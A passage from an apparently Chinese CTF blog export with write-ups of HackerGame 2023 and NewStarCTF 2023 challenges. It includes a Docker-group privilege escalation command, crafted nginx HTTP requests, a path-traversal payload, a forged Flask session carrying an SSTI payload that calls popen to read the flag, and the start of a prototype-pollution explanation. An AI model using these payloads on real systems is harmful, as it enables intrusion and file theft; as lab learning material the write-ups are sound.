<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">objects_dir=<span class="string">&quot;.git/objects&quot;</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> $(<span class="built_in">ls</span> <span class="variable">$objects_dir</span>); <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$dir</span>&quot;</span> != <span class="string">&quot;info&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$dir</span>&quot;</span> != <span class="string">&quot;pack&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">for</span> file <span class="keyword">in</span> $(<span class="built_in">ls</span> <span class="variable">$objects_dir</span>/<span class="variable">$dir</span>); <span class="keyword">do</span></span><br><span class="line">          object_hash=<span class="string">&quot;$dir<span class="variable">$file</span>&quot;</span></span><br><span class="line">          object_content=$(git cat-file -p <span class="variable">$object_hash</span> 2&gt;/dev/null)</span><br><span class="line">          <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$object_content</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;Object <span class="variable">$object_hash</span>:&quot;</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$object_content</span>&quot;</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;----------------------------------------&quot;</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>打印出来之后找到 flag。</p>
<p>官方题解是先通过 <code>git reflog</code> 查看完整操作历史，然后找到他最后一次的提交 hash，用 <code>git reset</code>回退到这次提交，查看 <code>README.md</code> 文件获得。</p>
<h3 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h3><p>题目：<br>本题中，你可以向一个 nginx 服务器（对应的容器为默认配置下的 nginx:1.25.2-bookworm）发送 HTTP 请求。你需要获取到不同的 HTTP 响应状态码以获取 flag，其中：</p>
<p>获取第一个 flag 需要收集 5 种状态码；<br>获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；<br>获取第三个 flag 需要收集 12 种状态码。<br>关于无状态码的判断逻辑如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">crlf = buf.find(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> buf.strip() != <span class="string">b&quot;&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> crlf == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;No CRLF found&quot;</span>)</span><br><span class="line">        status_line = buf[:crlf]</span><br><span class="line">        http_version, status_code, reason_phrase = status_line.split(<span class="string">b&quot; &quot;</span>, <span class="number">2</span>)</span><br><span class="line">        status_code = <span class="built_in">int</span>(status_code)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        buf += <span class="string">&quot;（无状态码）&quot;</span>.encode()</span><br><span class="line">        status_code = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>先来说说第二个 flag 的获得方式，根据上面这个代码，它查找第一个<code>\r\n</code>换行符时会尝试解析状态行，如何让他不返回状态码呢，这里我做的时候就是 fuzz 出来的，一个个试，其实不知道他的原理，看了官方文档才知道，构造 payload：</p>
<p><code>GET /\r\n</code></p>
<p>一般的 HTTP 头是通过两个空格去分割三个字符串,如果剩下两个空格就会回退到 HTTP&#x2F;0.9,上面这个 payload发送的就是 HTTP&#x2F;0.9 请求，这个请求只支持 GET，响应就直接响应文件内容，这样的请求没有状态码。即可获得 flag</p>
<p>第一个 flag 和第三个 flag，我构造的 payload 和原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /50x.html HTTP/1.1\r\nHost: localhost\r\nIf-None-Match: &quot;64dbafc8-1f1&quot;\r\n\r\n</span><br><span class="line">返回 304，这里需要获取资源的 e-tag, 304代表文件在指定条件下没有修改过。</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10000000\r\n\r\n</span><br><span class="line">返回 413，超出Content的范围</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nIf-Match: &quot;12345&quot;\r\n\r\n</span><br><span class="line">返回 412，发送一个带有失败前提条件的请求，这里用If-Match尝试去匹配etag，匹配失败就会返回412</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 411，没有 Content-Length 头</span><br><span class="line"></span><br><span class="line">PUT /index.html HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 405，PUT方法被禁止</span><br><span class="line"></span><br><span class="line">GET /a HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 404</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 400，不符合HTTP格式要求</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nExpect: 100-continue\r\n\r\n</span><br><span class="line">返回 100，nginx 只支持 100-continue 的 expect 回带，这里会返回 100-continue，100-continue代表服务器希望客户端继续请求或者忽略</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 200</span><br><span class="line"></span><br><span class="line">GET / HTTP/5.5\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 505，不支持该 http 方法</span><br><span class="line"></span><br><span class="line">GET /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 414，请求头太长</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nRange: bytes=1000-500\r\n\r\n</span><br><span class="line">返回 416，资源范围不合法</span><br></pre></td></tr></table></figure>

<p>这里官方还提到了一种，他自己也漏了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Transfer-Encoding: gzip\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br><span class="line">返回501，代表服务器不支持该功能，nginx里只支持chunked分块encoding，Transfer-Encoding这里换成chunked以外的都行</span><br></pre></td></tr></table></figure>

<h3 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h3><p>很简单的 Docker 提权，先简单讲一下 docker，如果一个用户被加入到 docker 的用户组，那么他们可以运行 docker 的命令而无需 sudo，这会引入安全问题，如果用户可以使用 docker 命令，那么他们实际上就拥有了访问主机上任意文件的能力，他们可以挂载主机上的任何目录到他的启动容器中。这道题中就算 flag 是软连接，也可以创建一个新的 docker 容器将 flag 指向的真实路径挂在为容器内的卷，操作如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 使用 docker 创建一个新容器并挂载 /flag</span><br><span class="line"># /flag 是我们想要读取的文件</span><br><span class="line"># /mnt 是容器内部的挂载点</span><br><span class="line">docker run -v /flag:/mnt/flag -it alpine /bin/sh</span><br><span class="line"># 在容器内读取挂载的 /flag 文件</span><br><span class="line">cat /mnt/flag</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="/2023/11/04/HackerGame2023/12.png"></p>
<h3 id="惜字如金-2-0"><a href="#惜字如金-2-0" class="headerlink" title="惜字如金 2.0"></a>惜字如金 2.0</h3><h4 id="惜字如金化标准"><a href="#惜字如金化标准" class="headerlink" title="惜字如金化标准"></a>惜字如金化标准</h4><p>惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「AEIOUaeiou」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：</p>
<p>第一原则（又称 creat 原则）：如单词最后一个字母为「e」或「E」，且该字母的上一个字母为辅音字母，则该字母予以删除。<br>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。<br>容易证明惜字如金化操作是幂等的：惜字如金化多次和惜字如金化一次的结果相同。</p>
<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Th siz of th fil may reduc after XZRJification</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_equals</span>(<span class="params">left, right</span>):</span><br><span class="line">    <span class="comment"># check whether left == right or not</span></span><br><span class="line">    <span class="keyword">if</span> left != right: exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cod_dict</span>():</span><br><span class="line">    <span class="comment"># prepar th cod dict</span></span><br><span class="line">    cod_dict = []</span><br><span class="line">    cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaet&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-p&#x27;</span>]</span><br><span class="line">    check_equals(<span class="built_in">set</span>(<span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> cod_dict), &#123;<span class="number">24</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(cod_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">input_codes</span>):</span><br><span class="line">    <span class="comment"># retriev th decrypted data</span></span><br><span class="line">    cod_dict = get_cod_dict()</span><br><span class="line">    output_chars = [cod_dict[c] <span class="keyword">for</span> c <span class="keyword">in</span> input_codes]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(output_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __nam__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># check som obvious things</span></span><br><span class="line">    check_equals(<span class="string">&#x27;creat&#x27;</span>, <span class="string">&#x27;cr&#x27;</span> + <span class="string">&#x27;at&#x27;</span>)</span><br><span class="line">    check_equals(<span class="string">&#x27;referer&#x27;</span>, <span class="string">&#x27;refer&#x27;</span> + <span class="string">&#x27;rer&#x27;</span>)</span><br><span class="line">    <span class="comment"># check th flag</span></span><br><span class="line">    flag = decrypt_data([<span class="number">53</span>, <span class="number">41</span>, <span class="number">85</span>, <span class="number">109</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">77</span>, <span class="number">90</span>,</span><br><span class="line">                         <span class="number">17</span>, <span class="number">118</span>, <span class="number">36</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">25</span>,</span><br><span class="line">                         <span class="number">31</span>, <span class="number">77</span>, <span class="number">27</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">118</span>, <span class="number">24</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">61</span>,</span><br><span class="line">                         <span class="number">25</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">36</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">113</span>, <span class="number">28</span>])</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;flag&#123;&#x27;</span>), <span class="number">0</span>)</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;&#125;&#x27;</span>), <span class="built_in">len</span>(flag) - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print th flag</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>我的做法是做推理，他说到了前 5 个字符是 ‘flag{‘ ,最后一个字符是 ‘}’ ，我们找规律发现这边至少有 119 个字符，而这一对串里只有 115 个，说明惜字如金去掉了部分字符，根据这个惜字如金的标准，首先我们现在每一个串的末尾加上 e，跑一遍看看结果：</p>
<p><code>5laulyoufeepr3cvees3df7weparsn3sfr1gwn!&#125;</code></p>
<p>这里可以看到字符’la’和字符’}’已经被凑出来了，然后就是一个个试了，我的方法就是在末尾添 e 删 e（因为存在 referer 标准，要添几个 e 都是不确定的），我最后试出来的是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaete&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?hee&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-pe&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>结果为：<br><code>flag&#123;yoe-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</code></p>
<p>但传上去发现是错的，我发现这个’yoe’有问题，改成’you’上传就正确了。</p>
<h3 id="高频率星球"><a href="#高频率星球" class="headerlink" title="高频率星球"></a>高频率星球</h3><p>题目：<br>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的高频率星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>高频率星人的视觉输入频率极高，可以一目千行、过目不忘，他们的交流对地球人来说过于超前了。flag 被藏在了这段代码中，但是现在只有高频率星人在终端浏览代码的时候，使用 asciinema 录制的文件了，你能从中还原出代码吗？</p>
<p>大概就是还原 asciinema 录制文件，然后就跑还原出来的代码，<br>这里用命令：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">asciinema cat asciinema_restore.rec &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>跑出来之后发现很多干扰，所以用 sed 过滤一下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">asciinema cat asciinema_restore.rec | sed &#x27;s/\x1b\[[<span class="number">0</span>-<span class="number">9</span>;]*[a-zA-Z]//g&#x27; | sed &#x27;s/\x1b.//g&#x27; | tr -d &#x27;\b&#x27; &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>跑出来后发现还是有部分没去掉的，就人工去了，大概就是 find 然后替换这样子，还原出代码后跑这个代码就能获得到 flag 了：</p>
<p><img src="/2023/11/04/HackerGame2023/13.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>WP 就写到这里了，之后会好好研究每一道题，之后的题解会单独放出来，这里就把我写出来的题做一个总结。这次 HackerGame 很有意思，期待明年的！</p>
]]></content>
      <categories>
        <category>HackerGame</category>
        <category>2023</category>
      </categories>
      <tags>
        <tag>社工</tag>
        <tag>爆破</tag>
        <tag>docker</tag>
        <tag>git</tag>
        <tag>HTTP</tag>
        <tag>Web 编程</tag>
        <tag>asciinema</tag>
        <tag>json</tag>
        <tag>yaml</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】Inject Me 目录穿越+ssti+flask_jwt</title>
    <url>/2023/11/07/NewStarCTF-Inject-Me/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】Inject-Me-目录穿越-ssti-flask-jwt"><a href="#【NewStarCTF2023】Inject-Me-目录穿越-ssti-flask-jwt" class="headerlink" title="【NewStarCTF2023】Inject Me 目录穿越+ssti+flask_jwt"></a>【NewStarCTF2023】Inject Me 目录穿越+ssti+flask_jwt</h1><p>进到靶机后, 稍微探索一下,发现有个这个图片泄露了源码:</p>
<p><img src="/2023/11/07/NewStarCTF-Inject-Me/image.png"></p>
<p>这里是一个目录穿越漏洞,其中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这一行代码是可以双写 <code>../</code> 成　<code>....//</code> 进行绕过的.然后由于这是一个 flask 框架,我们尝试去找它的 app.py 文件, 在寻找之前,先来了解 flask 框架的文件结构</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/your-application</span><br><span class="line">    /venv                <span class="comment"># 虚拟环境目录</span></span><br><span class="line">    /app                 <span class="comment"># 应用模块目录</span></span><br><span class="line">        __init__.py      <span class="comment"># 初始化应用并引入各个组件</span></span><br><span class="line">        /templates       <span class="comment"># Jinja2模板文件夹</span></span><br><span class="line">            layout.html  <span class="comment"># 基本布局模板</span></span><br><span class="line">            index.html   <span class="comment"># 主页模板</span></span><br><span class="line">            login.html   <span class="comment"># 登录页面模板</span></span><br><span class="line">            ...</span><br><span class="line">        /static          <span class="comment"># 静态文件夹（css, js, images等）</span></span><br><span class="line">            /css         <span class="comment"># CSS文件</span></span><br><span class="line">            /js          <span class="comment"># JavaScript文件</span></span><br><span class="line">            /images      <span class="comment"># 图片文件</span></span><br><span class="line">            ...</span><br><span class="line">        views.py         <span class="comment"># 视图函数模块</span></span><br><span class="line">        models.py        <span class="comment"># 数据库模型</span></span><br><span class="line">        forms.py         <span class="comment"># 表单类</span></span><br><span class="line">    app.py               <span class="comment"># 应用启动和配置</span></span><br><span class="line">    config.py            <span class="comment"># 配置文件</span></span><br><span class="line">    requirements.txt     <span class="comment"># 依赖项列表文件</span></span><br></pre></td></tr></table></figure>

<p>如果能实现目录穿越,那么 <code>app.py</code> 和 <code>config.py</code> 这个两个文件可以优先查看.</p>
<p>最后构造 url 请求如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download?file=....//....//app.py</span><br></pre></td></tr></table></figure>

<p>成功看到题目源码(这里只张贴源码有意义的部分):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br></pre></td></tr></table></figure>

<p>整个代码的逻辑就是从cookie 的 session 里取出 user, 如果 user 不等于 guest, 就经过一层过滤然后 <code>render_template_string</code> 渲染出来.</p>
<p>这里就是 ssti 绕过了, 同时还要找到 <code>secret key</code> 去构造 session.</p>
<p>再查看 <code>config.py</code> 文件,发现:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br></pre></td></tr></table></figure>

<p>成功拿到 secret_key, 然后就是写代码去生成对应的 session. flask 的 session 与普通的 jwt 生成不一样, 需要写代码去模拟 session 的签名.</p>
<p>而且这一行代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br></pre></td></tr></table></figure>

<p>过滤一堆关键字, 我的处理思路就是在 session 里面传关键字,然后在 user 里面调用(写的过程比较恶心,要去计算闭合和引号), 最后生成 session 的代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask session生成代码</span></span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET_KEY</span><br><span class="line"><span class="comment"># Flask 用来序列化 session 数据的接口</span></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"><span class="comment"># 使用上述 serializer 来生成 session</span></span><br><span class="line">session_data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&#123;% print(&#x27;&#x27;[session[&#x27;a&#x27;]][session[&#x27;b&#x27;]][0][session[&#x27;c&#x27;]]()[117][session[&#x27;d&#x27;]][session[&#x27;e&#x27;]][session[&#x27;f&#x27;]](&#x27;more /y0U3_f14g_1s_h3re&#x27;)[session[&#x27;g&#x27;]]())%&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;b&quot;</span>:<span class="string">&#x27;__bases__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;c&quot;</span>:<span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;d&quot;</span>:<span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;e&quot;</span>:<span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;f&quot;</span>:<span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;g&quot;</span>:<span class="string">&#x27;read&#x27;</span></span><br><span class="line">               &#125;</span><br><span class="line"><span class="comment"># session_data = &#123;&#125;</span></span><br><span class="line">encoded_session = session_serializer.dumps(session_data)</span><br><span class="line"><span class="built_in">print</span>(encoded_session)</span><br></pre></td></tr></table></figure>

<p>最后发送拿到 flag:</p>
<p><img src="/2023/11/07/NewStarCTF-Inject-Me/result.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ssti</tag>
        <tag>flask</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】OtenkiGirl nodejs 原型链污染</title>
    <url>/2023/11/06/NewStarCTF-Otenki-Girl/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】OtenkiGirl-nodejs-原型链污染"><a href="#【NewStarCTF2023】OtenkiGirl-nodejs-原型链污染" class="headerlink" title="【NewStarCTF2023】OtenkiGirl nodejs 原型链污染"></a>【NewStarCTF2023】OtenkiGirl nodejs 原型链污染</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>进去之后,是一个类似于 blog 的页面,你输入对应信息后加入购物车就会把东西张贴出来:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/image.png"></p>
<p>后台抓包发现是post json. 题目给了源码,打开源码文件后有 hint 文件,提示我们去 routes 文件夹里找,然后在 submit.js 文件里看到了 <code>merge</code> 函数.</p>
<p><code>merge</code>函数是一个经典的 nodejs 污染函数,接下来浅析一下什么是 nodejs 原型链污染。</p>
<h2 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs 原型链污染"></a>nodejs 原型链污染</h2><p> JavaScript 中，几乎所有对象都是 Object 的实例，对象原型包含了可以被继承的属性和方法。攻击者通过污染对象原型添加或修改属性，能够影响所有继承自该原型的对象。</p>
<p> 在一个对象生成后,会生成一个关于该对象的原型,如:</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cat = &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>上述代码构造了一个对象 cat, 首先会生成该 cat 的原型,即 <code>cat.prototype</code>.  生成 <code>prototype</code> 后,会生成一个隐式的构造函数 <code>cat()</code>, 这里构造函数 <code>cat()</code> 的原型 (protoype)就是 <code>cat.prototype</code>, 而对于构造函数构造出来的对象,也会有一个属性指向他的原型,即 <code>cat[&#39;__proto__&#39;]</code>.</p>
<p>同时由于 <code>cat</code> 对象是继承于 <code>Object</code> 对象,所以 <code>cat</code> 对象的原型 <code>cat.prototype</code> 也有原型,他的原型就是 <code>Object</code> 的原型 <code>Object.prototype</code>.</p>
<p>即 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat.prototype[&#x27;__proto__&#x27;] =  Object.prototype</span><br></pre></td></tr></table></figure>

<p>由于 <code>Object</code> 没有父类,所以 <code>Object</code> 的原型就是 null.</p>
<p>所以在 <code>cat</code> 这个对象就有一条原型链:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat(实例对象) -&gt; cat.prototype(实例原型) -&gt; Object[&#x27;__proto__&#x27;] -&gt; null</span><br></pre></td></tr></table></figure>

<p>给一张网图方便理解:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/image-1.png"></p>
<p>对于下面代码,我们调用了一个 cat 中不存在的属性:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">toString</span>);</span><br></pre></td></tr></table></figure>

<p>由于 cat 中没有 toString 属性, 他会沿着原型链向上搜索(先搜索 cat 自己的 prototype,再搜索 Object 的,最后到 null 返回)。也就是说在这里他会去<strong>尝试调用 Object.prototype 的 toString 属性</strong></p>
<p>如果攻击者能够篡改 Object.prototype.toString, 那么上面这句代码就会打印攻击者所指定的内容。</p>
<p>这里由于 Object 是几乎所有属性的类, 所以只要代码中存在</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj1[a] = obj2[a]</span><br></pre></td></tr></table></figure>

<p>其中<strong>如果 obj1 和 a 我们可以指定且obj1[a]的值我们可以指定</strong>,那么就可以触发原型链污染.</p>
<p>接下来分析为什么<code>merge</code>函数会触发原型链污染:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的 dst 和 src 都是 Object 类,这里首先会遍历 src 里的所有键 <code>key</code>, 然后将判断 <code>key</code> 是否在源实体和目标实体都存在,如果存在就递归 merge(这里递归是为了保证结构一致),不存在就直接赋值.</p>
<p>在这里如果 src 中存在我们人为构建的键名 <code>__proto__</code>, 如构造了</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> &#x27;__proto__&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span>&#x27;a&#x27;<span class="punctuation">:</span>&#x27;<span class="number">1</span>&#x27;<span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>那么在</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src)</span><br></pre></td></tr></table></figure>

